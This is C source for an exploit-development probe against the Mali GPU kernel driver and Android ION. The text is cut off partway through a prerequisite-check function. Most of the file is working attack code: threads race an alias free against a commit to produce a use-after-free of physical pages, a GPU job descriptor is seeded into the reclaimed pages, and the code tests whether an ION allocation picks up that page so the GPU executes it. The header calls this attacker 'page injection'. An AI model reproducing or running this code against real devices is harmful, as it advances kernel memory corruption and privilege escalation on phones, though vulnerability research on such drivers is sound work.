/*
 * mali_alias_ion_cross_pool_probe.c -- Test whether physical pages freed from
 * a Mali allocation after an alias race can be reclaimed by a fresh ION
 * system-heap allocation, then consumed by the GPU as an executable JC page.
 *
 * This directly tests whether the Mali page allocator and the ION system-heap
 * share the same underlying physical page pool on this device.
 *
 * If positive:
 *   A seeded WRITE_VALUE descriptor written into a reclaimed alias-race page
 *   executes from an ION-imported GPU VA without any same-context Mali
 *   MEM_ALLOC chain handoff.  That is a *cross-pool, cross-subsystem* physical
 *   page injection: attacker seeds content through the GPU alias path; a
 *   legitimate ION-alloc+MEM_IMPORT sequence becomes the surviving consumer.
 *
 * Probe sequence (per iteration):
 *   1.  Alloc native 16-page region; tag source pages 8-15 uniquely.
 *   2.  Create GPU-only alias covering pages 8-15.
 *   3.  Win the MEM_FREE(alias) vs MEM_COMMIT(native->8) race.
 *   4.  Reserve old alias VA window with commit=0 to keep later allocations
 *       disjoint from the stale numeric alias range.
 *   5.  Find the first disjoint 8-page reclaim allocation carrying tagged pages.
 *   6.  Seed one reclaimed page with a WRITE_VALUE-ZERO descriptor targeting
 *       dest_va, plus a sentinel at word 16.
 *   7.  Free the reclaim buffer (pages should return to page allocator pool).
 *   8.  Allocate up to MAX_ION_TRIES single-page ION system-heap buffers.
 *   9.  For each ION page, check the CPU-visible content for JC_SENTINEL.
 *  10.  If sentinel found: import that ION buffer into Mali and submit
 *       import_gpu_va as the JC head pointer — without overwriting the page.
 *  11.  Positive result: dest_va zeroed by GPU executing the seeded descriptor.
 *
 * Safety:
 *   - fork() + alarm(15) wrapper
 *   - no stale mapping write attempts
 *   - bounded ION and Mali allocation counts per iteration
 *   - full cleanup on every path
 */

#define _GNU_SOURCE
#define _FILE_OFFSET_BITS 64

#include <errno.h>
#include <fcntl.h>
#include <poll.h>
#include <pthread.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/wait.h>
#include <unistd.h>

/* ── Mali ioctl plumbing ──────────────────────────────────────────────────── */

#define MALI_IOCTL(size) _IOC(_IOC_READ | _IOC_WRITE, 0x80, 0, (size))

#define UKP_FUNC_ID_CHECK_VERSION 0
#define UK_FUNC_ID 512
#define KBASE_FUNC_MEM_ALLOC   (UK_FUNC_ID + 0)
#define KBASE_FUNC_MEM_IMPORT  (UK_FUNC_ID + 1)
#define KBASE_FUNC_MEM_COMMIT  (UK_FUNC_ID + 2)
#define KBASE_FUNC_MEM_QUERY   (UK_FUNC_ID + 3)
#define KBASE_FUNC_MEM_FREE    (UK_FUNC_ID + 4)
#define KBASE_FUNC_MEM_ALIAS   (UK_FUNC_ID + 6)
#define KBASE_FUNC_SET_FLAGS   (UK_FUNC_ID + 18)
#define KBASE_FUNC_JOB_SUBMIT  (UK_FUNC_ID + 28)

#define BASE_MEM_PROT_CPU_RD      (1U << 0)
#define BASE_MEM_PROT_CPU_WR      (1U << 1)
#define BASE_MEM_PROT_GPU_RD      (1U << 2)
#define BASE_MEM_PROT_GPU_WR      (1U << 3)
#define BASE_MEM_GROW_ON_GPF      (1U << 9)
#define BASE_MEM_COHERENT_LOCAL   (1U << 11)

#define KBASE_MEM_QUERY_COMMIT_SIZE 1

#define BASE_JD_REQ_CS                 (1U << 1)
#define BASE_JD_REQ_EXTERNAL_RESOURCES (1U << 8)

#define MALI_WRITE_VALUE_TYPE_ZERO 3

#define BASE_JD_EVENT_DONE               0x00000001
#define BASE_JD_EVENT_DATA_INVALID_FAULT 0x00000058
#define BASE_JD_EVENT_JOB_CANCELLED      0x00004002
#define BASE_JD_EVENT_JOB_INVALID        0x00004003

/* ── ION plumbing ─────────────────────────────────────────────────────────── */

#define ION_IOC_MAGIC 'I'
typedef int32_t ion_user_handle_t;

/* ARM32: size_t = uint32_t; MUST use uint32_t fields or heap_id_mask misaligns */
struct ion_allocation_data {
    uint32_t len;
    uint32_t align;
    uint32_t heap_id_mask;
    uint32_t flags;
    ion_user_handle_t handle;
};

struct ion_fd_data {
    ion_user_handle_t handle;
    int32_t fd;
};

struct ion_handle_data {
    ion_user_handle_t handle;
};

#define ION_IOC_ALLOC _IOWR(ION_IOC_MAGIC, 0, struct ion_allocation_data)
#define ION_IOC_FREE  _IOWR(ION_IOC_MAGIC, 1, struct ion_handle_data)
#define ION_IOC_SHARE _IOWR(ION_IOC_MAGIC, 4, struct ion_fd_data)

/* ── Mali struct layout ───────────────────────────────────────────────────── */

typedef union {
    uint32_t id;
    uint32_t ret;
    uint64_t align;
} uk_header;

struct uku_version_check_args {
    uk_header header;
    uint16_t major;
    uint16_t minor;
    uint8_t padding[4];
};

struct kbase_uk_set_flags {
    uk_header header;
    uint32_t create_flags;
    uint32_t padding;
};

struct kbase_uk_mem_alloc {
    uk_header header;
    uint64_t va_pages;
    uint64_t commit_pages;
    uint64_t extent;
    uint32_t flags;
    uint32_t pad0;
    uint64_t gpu_va;
    uint16_t va_alignment;
    uint8_t pad1[6];
};

struct kbase_uk_mem_commit {
    uk_header header;
    uint64_t gpu_addr;
    uint64_t pages;
    uint32_t result_subcode;
    uint32_t padding;
};

struct kbase_uk_mem_query {
    uk_header header;
    uint64_t gpu_addr;
    uint64_t query;
    uint64_t value;
};

struct kbase_uk_mem_free {
    uk_header header;
    uint64_t gpu_addr;
};

struct base_mem_aliasing_info {
    uint64_t handle;
    uint64_t offset;
    uint64_t length;
};

struct kbase_uk_mem_alias {
    uk_header header;
    uint64_t flags;
    uint64_t stride;
    uint64_t nents;
    uint64_t ai;
    uint64_t gpu_va;
    uint64_t va_pages;
};

struct base_jd_udata {
    uint64_t blob[2];
};

struct base_dependency {
    uint8_t atom_id;
    uint8_t dependency_type;
};

struct base_jd_atom_v2_old56 {
    uint64_t jc;
    struct base_jd_udata udata;
    uint64_t extres_list;
    uint16_t nr_extres;
    uint16_t core_req;
    struct base_dependency pre_dep[2];
    uint8_t atom_number;
    uint8_t prio;
    uint8_t device_nr;
    uint8_t padding[5];
    uint8_t extra[8];
};

struct kbase_uk_job_submit_trace {
    uk_header header;
    uint64_t addr;
    uint32_t nr_atoms;
    uint32_t stride;
    uint32_t gles_ctx_handle;
    uint32_t padding;
};

struct base_jd_event_v2 {
    uint32_t event_code;
    uint8_t atom_number;
    uint8_t pad[3];
    struct base_jd_udata udata;
};

struct base_external_resource {
    uint64_t ext_resource;  /* GPU VA; bit 0 = exclusive */
};

/* ── Probe constants ──────────────────────────────────────────────────────── */

#define PAGE_BYTES          4096U
#define NATIVE_PAGES        16U
#define SOURCE_OFFSET_PAGES 8U
#define SOURCE_PAGES        8U
#define RECLAIM_PAGES       8U
#define MAX_RACE_ITERS      20
#define MAX_RECLAIM_ALLOCS  8
#define MAX_ION_TRIES       12  /* more ION pages = more chance of catching a seeded page */
#define SOURCE_ID_NONE      0xFFU
#define CANARY64            0xDEADBEEFCAFEBABEULL
#define DEST64              0xCCCCCCCCCCCCCCCCULL
#define JC_SENTINEL         0x4a43534545443030ULL /* "JCSEED00" */
#define JC_META_MAGIC       0x4a434d4554413030ULL /* "JCMETA00" */
#define JC_SENTINEL_WORD    16U

/* ── Probe state shared with race threads ─────────────────────────────────── */

struct mapped_alloc {
    uint64_t gpu_va;
    uint64_t *cpu;
    uint8_t source_ids[RECLAIM_PAGES];
    unsigned source_bitmap;
    int source_page_count;
    int overlaps_alias;
};

struct attempt_result {
    int race_won;
    int reserved_window;
    int reclaim_seeded;
    int ion_sentinel_found;
    int execute_hit;
    int reclaim_alloc_index;
    int ion_try_index;
    size_t seed_page_index;
    size_t ion_sentinel_page;
    uint8_t seed_source_id;
    uint32_t execute_event;
};

static int g_fd = -1;
static volatile int g_ready = 0;
static int g_commit_ret = -1;
static uint64_t g_alias_gpu_va = 0;
static uint64_t g_native_gpu_va = 0;

/* ── Mali helpers ─────────────────────────────────────────────────────────── */

static int mali_ioctl(int fd, void *buf, size_t size)
{
    errno = 0;
    return ioctl(fd, MALI_IOCTL(size), buf);
}

static int mali_init(int fd)
{
    struct uku_version_check_args ver;
    struct kbase_uk_set_flags flags;
    void *mtp;

    memset(&ver, 0, sizeof(ver));
    ver.header.id = UKP_FUNC_ID_CHECK_VERSION;
    ver.major = 10;
    ver.minor = 2;
    if (mali_ioctl(fd, &ver, sizeof(ver)) < 0 || ver.header.ret != 0)
        return -1;

    memset(&flags, 0, sizeof(flags));
    flags.header.id = KBASE_FUNC_SET_FLAGS;
    if (mali_ioctl(fd, &flags, sizeof(flags)) < 0 || flags.header.ret != 0)
        return -1;

    mtp = (void *)syscall(__NR_mmap2, (unsigned long)NULL, (size_t)PAGE_BYTES,
                          PROT_NONE, MAP_SHARED, fd, (unsigned long)2);
    if (mtp == MAP_FAILED) {
        mtp = (void *)syscall(__NR_mmap2, (unsigned long)NULL, (size_t)PAGE_BYTES,
                              PROT_NONE, MAP_SHARED, fd, (unsigned long)3);
    }
    return (mtp == MAP_FAILED) ? -1 : 0;
}

static uint64_t mali_alloc_ext(int fd, uint64_t va_pages, uint64_t commit_pages,
                               uint64_t extent, uint32_t flags)
{
    struct kbase_uk_mem_alloc alloc;

    memset(&alloc, 0, sizeof(alloc));
    alloc.header.id = KBASE_FUNC_MEM_ALLOC;
    alloc.va_pages = va_pages;
    alloc.commit_pages = commit_pages;
    alloc.extent = extent;
    alloc.flags = flags;
    if (mali_ioctl(fd, &alloc, sizeof(alloc)) < 0)
        return 0;
    return alloc.header.ret == 0 ? alloc.gpu_va : 0;
}

static uint64_t mali_alloc_flags(int fd, uint64_t pages, uint32_t flags)
{
    return mali_alloc_ext(fd, pages, pages, pages, flags);
}

static int mali_commit(int fd, uint64_t gpu_va, uint64_t pages)
{
    struct kbase_uk_mem_commit commit;

    memset(&commit, 0, sizeof(commit));
    commit.header.id = KBASE_FUNC_MEM_COMMIT;
    commit.gpu_addr = gpu_va;
    commit.pages = pages;
    mali_ioctl(fd, &commit, sizeof(commit));
    return commit.header.ret;
}

static uint64_t mali_query_commit(int fd, uint64_t gpu_va)
{
    struct kbase_uk_mem_query query;

    memset(&query, 0, sizeof(query));
    query.header.id = KBASE_FUNC_MEM_QUERY;
    query.gpu_addr = gpu_va;
    query.query = KBASE_MEM_QUERY_COMMIT_SIZE;
    mali_ioctl(fd, &query, sizeof(query));
    return query.value;
}

static uint64_t mali_alias(int fd, uint64_t src_gpu_va, uint64_t offset_pages,
                           uint64_t length_pages)
{
    struct base_mem_aliasing_info info;
    struct kbase_uk_mem_alias alias;

    memset(&info, 0, sizeof(info));
    info.handle = src_gpu_va;
    info.offset = offset_pages;
    info.length = length_pages;

    memset(&alias, 0, sizeof(alias));
    alias.header.id = KBASE_FUNC_MEM_ALIAS;
    alias.flags = BASE_MEM_PROT_GPU_RD | BASE_MEM_PROT_GPU_WR;
    alias.stride = length_pages;
    alias.nents = 1;
    alias.ai = (uint64_t)(uintptr_t)&info;
    if (mali_ioctl(fd, &alias, sizeof(alias)) < 0)
        return 0;
    return alias.header.ret == 0 ? alias.gpu_va : 0;
}

static void mali_free(int fd, uint64_t gpu_va)
{
    struct kbase_uk_mem_free free_req;

    if (!gpu_va)
        return;
    memset(&free_req, 0, sizeof(free_req));
    free_req.header.id = KBASE_FUNC_MEM_FREE;
    free_req.gpu_addr = gpu_va;
    mali_ioctl(fd, &free_req, sizeof(free_req));
}

static void *mali_cpu_map(int fd, uint64_t gpu_va, size_t bytes)
{
    return (void *)syscall(__NR_mmap2, (unsigned long)NULL, bytes,
                           PROT_READ | PROT_WRITE, MAP_SHARED, fd,
                           (unsigned long)(gpu_va >> 12));
}

/* Import a DMA-buf fd into Mali as GPU-mapped memory.
 * phandle: pointer to the dma_fd (MEM_IMPORT type=2 = DMA_BUF).
 * Returns GPU VA on success, 0 on failure. */
static uint64_t mali_import_ion(int mali_fd, int *fd_ptr)
{
    uint8_t buf[48];
    int rc;
    uint32_t ret;
    uint64_t gpu_va;

    memset(buf, 0, sizeof(buf));
    *(uint32_t *)(buf + 0) = KBASE_FUNC_MEM_IMPORT;
    *(uint64_t *)(buf + 8) = (uint64_t)(uintptr_t)fd_ptr;
    *(uint32_t *)(buf + 16) = 2;   /* BASE_MEM_IMPORT_TYPE_UMM / DMA_BUF */
    /* Use the same flags as mali_extres_import_chain_probe: CPU+GPU RW, no COHERENT_LOCAL.
     * COHERENT_LOCAL causes JOB_CANCELLED on imported-page JC submissions. */
    *(uint64_t *)(buf + 24) = 0x0000000FULL;

    rc = mali_ioctl(mali_fd, buf, sizeof(buf));
    ret = *(uint32_t *)(buf + 4);
    gpu_va = *(uint64_t *)(buf + 32);
    printf("  MEM_IMPORT: rc=%d ret=0x%x gpu_va=0x%llx\n",
           rc, ret, (unsigned long long)gpu_va);
    return (rc == 0 && ret == 0) ? gpu_va : 0;
}

/* ── ION helpers ──────────────────────────────────────────────────────────── */

static int ion_alloc_one_page(int ion_fd, int *dma_fd_out, ion_user_handle_t *handle_out,
                              void **map_out)
{
    struct ion_allocation_data alloc;
    struct ion_fd_data share;
    void *map;

    memset(&alloc, 0, sizeof(alloc));
    alloc.len = PAGE_BYTES;
    alloc.align = PAGE_BYTES;
    alloc.heap_id_mask = 1U << 0;  /* system heap — same pool as page allocator */
    if (ioctl(ion_fd, ION_IOC_ALLOC, &alloc) < 0)
        return -1;

    memset(&share, 0, sizeof(share));
    share.handle = alloc.handle;
    if (ioctl(ion_fd, ION_IOC_SHARE, &share) < 0) {
        struct ion_handle_data hd;
        hd.handle = alloc.handle;
        ioctl(ion_fd, ION_IOC_FREE, &hd);
        return -1;
    }

    map = mmap(NULL, PAGE_BYTES, PROT_READ | PROT_WRITE, MAP_SHARED, share.fd, 0);
    if (map == MAP_FAILED) {
        close(share.fd);
        struct ion_handle_data hd;
        hd.handle = alloc.handle;
        ioctl(ion_fd, ION_IOC_FREE, &hd);
        return -1;
    }

    *dma_fd_out = share.fd;
    *handle_out = alloc.handle;
    *map_out = map;
    return 0;
}

static void ion_free_one_page(int ion_fd, int dma_fd, ion_user_handle_t handle, void *map)
{
    struct ion_handle_data hd;

    if (map && map != MAP_FAILED)
        munmap(map, PAGE_BYTES);
    if (dma_fd >= 0)
        close(dma_fd);
    if (handle >= 0) {
        hd.handle = handle;
        ioctl(ion_fd, ION_IOC_FREE, &hd);
    }
}

/* ── Shared event/submit helpers ─────────────────────────────────────────── */

static int read_event(int fd, struct base_jd_event_v2 *ev)
{
    struct pollfd pfd = { fd, POLLIN | POLLERR | POLLHUP, 0 };

    if (poll(&pfd, 1, 3000) <= 0)
        return -1;
    return read(fd, ev, sizeof(*ev)) == (ssize_t)sizeof(*ev) ? 0 : -1;
}

static const char *event_name(uint32_t code)
{
    switch (code) {
    case BASE_JD_EVENT_DONE:               return "DONE";
    case BASE_JD_EVENT_DATA_INVALID_FAULT: return "DATA_INVALID_FAULT";
    case BASE_JD_EVENT_JOB_CANCELLED:      return "JOB_CANCELLED";
    case BASE_JD_EVENT_JOB_INVALID:        return "JOB_INVALID";
    default:                               return "UNKNOWN";
    }
}

static void fill_atom(struct base_jd_atom_v2_old56 *atom, uint64_t jc, uint8_t atom_number)
{
    memset(atom, 0, sizeof(*atom));
    atom->jc = jc;
    atom->core_req = BASE_JD_REQ_CS;
    atom->atom_number = atom_number;
    atom->udata.blob[0] = 0xBEEF000000000000ULL | atom_number;
}

static void fill_atom_extres(struct base_jd_atom_v2_old56 *atom, uint64_t jc,
                             uint8_t atom_number, uint64_t extres_list, uint16_t nr_extres)
{
    memset(atom, 0, sizeof(*atom));
    atom->jc = jc;
    atom->core_req = BASE_JD_REQ_CS | BASE_JD_REQ_EXTERNAL_RESOURCES;
    atom->atom_number = atom_number;
    atom->extres_list = extres_list;
    atom->nr_extres = nr_extres;
    atom->udata.blob[0] = 0xBEEF000000000000ULL | atom_number;
}

static int submit_jc(int fd, uint64_t jc_gpu_va, uint8_t atom_number, uint32_t *event_code_out)
{
    struct base_jd_atom_v2_old56 atom;
    struct kbase_uk_job_submit_trace submit;
    struct base_jd_event_v2 ev;

    fill_atom(&atom, jc_gpu_va, atom_number);

    memset(&submit, 0, sizeof(submit));
    submit.header.id = KBASE_FUNC_JOB_SUBMIT;
    submit.addr = (uint64_t)(uintptr_t)&atom;
    submit.nr_atoms = 1;
    submit.stride = sizeof(atom);
    if (mali_ioctl(fd, &submit, sizeof(submit)) < 0 || submit.header.ret != 0)
        return -1;
    if (read_event(fd, &ev) < 0)
        return -1;
    if (event_code_out)
        *event_code_out = ev.event_code;
    return 0;
}

/* Submit an atom where the JC itself is an imported GPU VA — requires extres. */
static int submit_jc_extres(int fd, uint64_t jc_gpu_va, uint8_t atom_number,
                             uint64_t import_gpu_va, uint32_t *event_code_out)
{
    struct base_jd_atom_v2_old56 atom;
    struct kbase_uk_job_submit_trace submit;
    struct base_jd_event_v2 ev;
    struct base_external_resource extres[1];

    extres[0].ext_resource = import_gpu_va | 0;  /* shared (bit 0 = 0) */
    fill_atom_extres(&atom, jc_gpu_va, atom_number,
                     (uint64_t)(uintptr_t)extres, 1);

    memset(&submit, 0, sizeof(submit));
    submit.header.id = KBASE_FUNC_JOB_SUBMIT;
    submit.addr = (uint64_t)(uintptr_t)&atom;
    submit.nr_atoms = 1;
    submit.stride = sizeof(atom);
    if (mali_ioctl(fd, &submit, sizeof(submit)) < 0 || submit.header.ret != 0)
        return -1;
    if (read_event(fd, &ev) < 0)
        return -1;
    if (event_code_out)
        *event_code_out = ev.event_code;
    return 0;
}

/* ── Descriptor / sentinel helpers ──────────────────────────────────────────── */

static void build_wv_desc(uint32_t *jc_cpu, uint64_t target_gpu_va)
{
    memset(jc_cpu, 0, 56);
    jc_cpu[4] = 0x00010005;
    jc_cpu[8] = (uint32_t)target_gpu_va;
    jc_cpu[9] = (uint32_t)(target_gpu_va >> 32);
    jc_cpu[10] = MALI_WRITE_VALUE_TYPE_ZERO;
}

static uint64_t source_tag(uint8_t source_id)
{
    return CANARY64 ^ ((uint64_t)(source_id + 1U) << 56);
}

static int source_tag_to_id(uint64_t value)
{
    uint8_t source_id;

    for (source_id = 0; source_id < SOURCE_PAGES; source_id++) {
        if (value == source_tag(source_id))
            return (int)source_id;
    }
    return -1;
}

static void fill_source_tags(uint8_t *cpu_base)
{
    size_t page;
    size_t word;
    size_t words_per_page = PAGE_BYTES / sizeof(uint64_t);

    for (page = 0; page < SOURCE_PAGES; page++) {
        uint64_t value = source_tag((uint8_t)page);
        uint64_t *page_cpu = (uint64_t *)(cpu_base + (SOURCE_OFFSET_PAGES + page) * PAGE_BYTES);

        for (word = 0; word < words_per_page; word++)
            page_cpu[word] = value;
    }
}

static int snapshot_source_pages(const uint64_t *cpu_base, size_t pages, uint8_t *source_ids)
{
    size_t i;
    size_t page_stride = PAGE_BYTES / sizeof(uint64_t);
    int count = 0;

    memset(source_ids, SOURCE_ID_NONE, pages);
    for (i = 0; i < pages; i++) {
        int source_id = source_tag_to_id(cpu_base[i * page_stride]);

        if (source_id >= 0) {
            source_ids[i] = (uint8_t)source_id;
            count++;
        }
    }
    return count;
}

static unsigned source_bitmap_from_ids(const uint8_t *source_ids, size_t pages)
{
    size_t i;
    unsigned bitmap = 0;

    for (i = 0; i < pages; i++) {
        if (source_ids[i] != SOURCE_ID_NONE)
            bitmap |= (1U << source_ids[i]);
    }
    return bitmap;
}

static void format_source_ids(unsigned bitmap, char *buf, size_t buf_len)
{
    size_t used = 0;
    unsigned source_id;

    if (!bitmap) {
        snprintf(buf, buf_len, "none");
        return;
    }

    buf[0] = '\0';
    for (source_id = 0; source_id < SOURCE_PAGES; source_id++) {
        int written;

        if (!(bitmap & (1U << source_id)))
            continue;
        written = snprintf(buf + used, buf_len - used, "%s%u",
                           used ? "," : "", source_id);
        if (written < 0 || (size_t)written >= buf_len - used)
            break;
        used += (size_t)written;
    }
}

static int select_source_page(const uint8_t *source_ids, size_t pages,
                              uint8_t *source_id_out, size_t *page_index_out)
{
    size_t i;

    for (i = 0; i < pages; i++) {
        if (source_ids[i] != SOURCE_ID_NONE) {
            *source_id_out = source_ids[i];
            *page_index_out = i;
            return 1;
        }
    }
    return 0;
}

/* Write a WRITE_VALUE-ZERO descriptor at offset 0 of the page, plus a
 * detection sentinel and metadata at word 16.  The sentinel lets us
 * recognise the page if it later appears in an ION allocation. */
static void seed_descriptor_page(uint64_t *page_cpu, uint64_t target_gpu_va, uint8_t source_id)
{
    uint32_t *jc_cpu = (uint32_t *)page_cpu;

    memset(page_cpu, 0, PAGE_BYTES);
    build_wv_desc(jc_cpu, target_gpu_va);
    page_cpu[JC_SENTINEL_WORD] = JC_SENTINEL;
    page_cpu[JC_SENTINEL_WORD + 1] = (JC_META_MAGIC & ~0xFFULL) | (uint64_t)source_id;
    page_cpu[JC_SENTINEL_WORD + 2] = target_gpu_va;
    __builtin___clear_cache((char *)page_cpu, (char *)page_cpu + PAGE_BYTES);
    __sync_synchronize();
}

static int page_has_sentinel(const uint64_t *page_cpu)
{
    return page_cpu[JC_SENTINEL_WORD] == JC_SENTINEL &&
           (page_cpu[JC_SENTINEL_WORD + 1] & ~0xFFULL) == (JC_META_MAGIC & ~0xFFULL);
}

/* ── Race infrastructure ─────────────────────────────────────────────────── */

static int ranges_overlap(uint64_t start_a, uint64_t pages_a,
                          uint64_t start_b, uint64_t pages_b)
{
    uint64_t end_a = start_a + pages_a * PAGE_BYTES;
    uint64_t end_b = start_b + pages_b * PAGE_BYTES;

    return !(end_a <= start_b || end_b <= start_a);
}

static void *thread_free(void *arg)
{
    (void)arg;
    while (!g_ready) {}
    mali_free(g_fd, g_alias_gpu_va);
    return NULL;
}

static void *thread_commit(void *arg)
{
    (void)arg;
    while (!g_ready) {}
    g_commit_ret = mali_commit(g_fd, g_native_gpu_va, SOURCE_OFFSET_PAGES);
    return NULL;
}

static int reserve_alias_window(int fd, uint64_t alias_va, uint64_t *guard_va_out)
{
    uint64_t window_va;
    uint64_t window_commit;

    window_va = mali_alloc_ext(fd, SOURCE_PAGES, 0, SOURCE_PAGES,
                               BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_CPU_WR |
                               BASE_MEM_PROT_GPU_RD | BASE_MEM_PROT_GPU_WR |
                               BASE_MEM_GROW_ON_GPF);
    if (!window_va)
        return 0;

    window_commit = mali_query_commit(fd, window_va);
    if (window_va == alias_va && window_commit == 0) {
        *guard_va_out = window_va;
        return 1;
    }

    printf("[*] reserve miss: window landed at 0x%llx commit=%llu (wanted stale alias 0x%llx)\n",
           (unsigned long long)window_va,
           (unsigned long long)window_commit,
           (unsigned long long)alias_va);
    mali_free(fd, window_va);
    return 0;
}

static int alloc_mapped_region(int fd, uint64_t alias_va, struct mapped_alloc *slot)
{
    memset(slot, 0, sizeof(*slot));
    slot->gpu_va = mali_alloc_flags(fd, RECLAIM_PAGES,
                                    BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_CPU_WR |
                                    BASE_MEM_PROT_GPU_RD | BASE_MEM_PROT_GPU_WR |
                                    BASE_MEM_GROW_ON_GPF);
    if (!slot->gpu_va)
        return -1;

    slot->cpu = mali_cpu_map(fd, slot->gpu_va, RECLAIM_PAGES * PAGE_BYTES);
    if (slot->cpu == MAP_FAILED) {
        slot->cpu = NULL;
        mali_free(fd, slot->gpu_va);
        slot->gpu_va = 0;
        return -1;
    }

    slot->source_page_count = snapshot_source_pages(slot->cpu, RECLAIM_PAGES, slot->source_ids);
    slot->source_bitmap = source_bitmap_from_ids(slot->source_ids, RECLAIM_PAGES);
    slot->overlaps_alias = ranges_overlap(slot->gpu_va, RECLAIM_PAGES, alias_va, SOURCE_PAGES);
    return 0;
}

static void free_mapped_region(int fd, struct mapped_alloc *slot)
{
    if (slot->cpu) {
        munmap(slot->cpu, RECLAIM_PAGES * PAGE_BYTES);
        slot->cpu = NULL;
    }
    if (slot->gpu_va) {
        mali_free(fd, slot->gpu_va);
        slot->gpu_va = 0;
    }
}

static int find_disjoint_reclaim_candidate(int fd, uint64_t alias_va,
                                           struct mapped_alloc *slot,
                                           int *alloc_index_out)
{
    int i;

    for (i = 0; i < MAX_RECLAIM_ALLOCS; i++) {
        char ids_buf[64];

        if (alloc_mapped_region(fd, alias_va, slot) < 0)
            return -1;

        format_source_ids(slot->source_bitmap, ids_buf, sizeof(ids_buf));
        printf("[*] reclaim alloc=%d gpu_va=0x%llx overlap=%s tagged=%d ids=%s\n",
               i + 1,
               (unsigned long long)slot->gpu_va,
               slot->overlaps_alias ? "yes" : "no",
               slot->source_page_count,
               ids_buf);

        if (slot->source_page_count > 0 && !slot->overlaps_alias) {
            *alloc_index_out = i + 1;
            return 1;
        }

        free_mapped_region(fd, slot);
    }

    return 0;
}

/* ── Baseline / prereq verification ─────────────────────────────────────── */

static int verify_control_submit(int fd)
{
    uint64_t scratch_va = 0;
    uint64_t jc_va = 0;
    uint64_t *scratch_cpu = MAP_FAILED;
    uint32_t *jc_cpu = MAP_FAILED;
    uint32_t event_code = 0;
    int ok = -1;

    scratch_va = mali_alloc_flags(fd, 1, BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_CPU_WR |
                                      BASE_MEM_PROT_GPU_RD | BASE_MEM_PROT_GPU_WR |
                                      BASE_MEM_COHERENT_LOCAL);
    jc_va = mali_alloc_flags(fd, 1, BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_CPU_WR |
                                 BASE_MEM_PROT_GPU_RD | BASE_MEM_PROT_GPU_WR |
                                 BASE_MEM_COHERENT_LOCAL);
    if (!scratch_va || !jc_va)
        goto cleanup;

    scratch_cpu = mali_cpu_map(fd, scratch_va, PAGE_BYTES);
    jc_cpu = mali_cpu_map(fd, jc_va, PAGE_BYTES);
    if (scratch_cpu == MAP_FAILED || jc_cpu == MAP_FAILED)
        goto cleanup;

    scratch_cpu[0] = 0xAAAAAAAAAAAAAAAAULL;
    build_wv_desc(jc_cpu, scratch_va);
    __builtin___clear_cache((char *)jc_cpu, (char *)jc_cpu + PAGE_BYTES);
    __sync_synchronize();
    if (submit_jc(fd, jc_va, 0x10, &event_code) < 0)
        goto cleanup;
    if (event_code == BASE_JD_EVENT_DONE && scratch_cpu[0] == 0)
        ok = 0;

cleanup:
    if (jc_cpu != MAP_FAILED) munmap(jc_cpu, PAGE_BYTES);
    if (scratch_cpu != MAP_FAILED) munmap(scratch_cpu, PAGE_BYTES);
    if (jc_va) mali_free(fd, jc_va);
    if (scratch_va) mali_free(fd, scratch_va);
    return ok;
}

static int verify_ion_import_baseline(int fd, int ion_fd)
{
    int dma_fd = -1;
    ion_user_handle_t handle = -1;
    void *ion_map = MAP_FAILED;
    uint64_t import_gpu_va = 0;
    uint64_t scratch_va = 0;
    uint64_t *scratch_cpu = MAP_FAILED;
    uint32_t event_code = 0;
    int ok = -1;

    printf("[*] ION import baseline: import a fresh 1-page ION buffer and submit as JC\n");

    if (ion_alloc_one_page(ion_fd, &dma_fd, &handle, &ion_map) < 0) {
        printf("[-] ION baseline: alloc failed errno=%d (%s)\n", errno, strerror(errno));
        return -1;
    }

    scratch_va = mali_alloc_flags(fd, 1, BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_CPU_WR |
                                      BASE_MEM_PROT_GPU_RD | BASE_MEM_PROT_GPU_WR |
                                      BASE_MEM_COHERENT_LOCAL);
    if (!scratch_va) {
        printf("[-] ION baseline: scratch alloc failed\n");
        goto out;
    }
    scratch_cpu = mali_cpu_map(fd, scratch_va, PAGE_BYTES);
    if (scratch_cpu == MAP_FAILED) {
        printf("[-] ION baseline: scratch mmap failed\n");
        goto out;
    }
    scratch_cpu[0] = 0xAAAAAAAAAAAAAAAAULL;

    import_gpu_va = mali_import_ion(fd, &dma_fd);
    if (!import_gpu_va) {
        printf("[-] ION baseline: MEM_IMPORT failed\n");
        goto out;
    }

    build_wv_desc((uint32_t *)ion_map, scratch_va);
    __builtin___clear_cache((char *)ion_map, (char *)ion_map + PAGE_BYTES);
    __sync_synchronize();

    /* Use extres: imported GPU VA as JC requires BASE_JD_REQ_EXTERNAL_RESOURCES */
    if (submit_jc_extres(fd, import_gpu_va, 0x11, import_gpu_va, &event_code) < 0) {
        printf("[-] ION baseline: submit failed\n");
        goto out;
    }

    printf("[*] ION baseline event=%s scratch=0x%016llx\n",
           event_name(event_code), (unsigned long long)scratch_cpu[0]);
    if (event_code == BASE_JD_EVENT_DONE && scratch_cpu[0] == 0) {
        printf("[+] ION import baseline CONFIRMED: imported JC executes correctly\n");
        ok = 0;
    } else {
        printf("[-] ION import baseline FAILED: import JC did not execute as expected\n");
    }

out:
    if (import_gpu_va) mali_free(fd, import_gpu_va);
    if (scratch_cpu != MAP_FAILED) munmap(scratch_cpu, PAGE_BYTES);
    if (scratch_va) mali_free(fd, scratch_va);
    ion_free_one_page(ion_fd, dma_fd, handle, ion_map);
    return ok;
}

static int verify_prereqs(int fd, int ion_fd)
{
    uint64_t native_va;
    uint64_t alias_va;
    int shrink_with_alias;
    int shrink_without_alias;
    uint64_t commit_now;

    native_va = mali_alloc_flags(fd, NATIVE_PAGES,
                                 BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_CPU_WR |
                                 BASE_MEM_PROT_GPU_RD | BASE_MEM_PROT_GPU_WR |
                                 BASE_MEM_GROW_ON_GPF);
    if (!native_va)
        return -1;

    alias_va = mali_alias(fd, native_va, SOURCE_OFFSET_PAGES, SOURCE_PAGES);
    if (!alias_va) {
        mali_free(fd, native_va);
        return -1;
    }

    shrink_with_alias = mali_commit(fd, native_va, SOURCE_OFFSET_PAGES);
    mali_free(fd, alias_va);
    shrink_without_alias = mali_commit(fd, native_va, SOURCE_OFFSET_PAGES);
    commit_now = mali_query_commit(fd, native_va);
    mali_free(fd, native_va);

